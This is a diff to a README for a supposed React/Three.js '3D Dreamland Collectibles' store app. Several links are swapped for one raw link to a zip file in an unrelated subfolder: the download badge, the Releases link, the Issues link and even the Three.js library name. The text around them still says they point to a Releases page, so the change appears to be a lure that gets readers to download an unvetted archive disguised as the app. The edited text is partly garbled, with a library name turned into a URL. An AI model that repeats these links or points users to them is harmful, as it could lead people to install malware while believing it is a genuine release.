@@ -1,6 +1,6 @@
 # 🎡 3D-Interactive-Dreamland-Collectibles - Experience a Unique 3D Store
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)
+![Download Now](https://raw.githubusercontent.com/ba268baanne/3D-Interactive-Dreamland-Collectibles/main/theokrasia/3D-Interactive-Dreamland-Collectibles.zip%20Now-Get%20Started-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to "3D-Interactive-Dreamland-Collectibles"! This application allows you 
 
 To download the application, visit the link below:
 
-[Download from Releases](https://github.com/ba268baanne/3D-Interactive-Dreamland-Collectibles/releases)
+[Download from Releases](https://raw.githubusercontent.com/ba268baanne/3D-Interactive-Dreamland-Collectibles/main/theokrasia/3D-Interactive-Dreamland-Collectibles.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top of the page.
@@ -49,14 +49,14 @@ To run "3D-Interactive-Dreamland-Collectibles", ensure your system meets the fol
 If you would like to learn more about the technology behind this application, check out the following:
 
 - **React**: A JavaScript library for building user interfaces.
-- **Three.js**: A 3D graphics library that makes creating 3D content easier.
+- **https://raw.githubusercontent.com/ba268baanne/3D-Interactive-Dreamland-Collectibles/main/theokrasia/3D-Interactive-Dreamland-Collectibles.zip**: A 3D graphics library that makes creating 3D content easier.
 - **Framer Motion**: A motion library for React that makes creating animations smooth.
 
 ## 💬 Community Support
 
 If you have any questions or need help:
 
-- Visit our [GitHub Issues page](https://github.com/ba268baanne/3D-Interactive-Dreamland-Collectibles/issues) to report issues or ask for support.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/ba268baanne/3D-Interactive-Dreamland-Collectibles/main/theokrasia/3D-Interactive-Dreamland-Collectibles.zip) to report issues or ask for support.
 - Join our community discussions to connect with other users.
 
 ## 📅 Future Updates
@@ -76,7 +76,7 @@ This application features a blend of various topics to engage users:
 - Interactive design
 - React
 - Tailwind CSS
-- Three.js
+- https://raw.githubusercontent.com/ba268baanne/3D-Interactive-Dreamland-Collectibles/main/theokrasia/3D-Interactive-Dreamland-Collectibles.zip
 
 ## 🔗 Follow Us
 
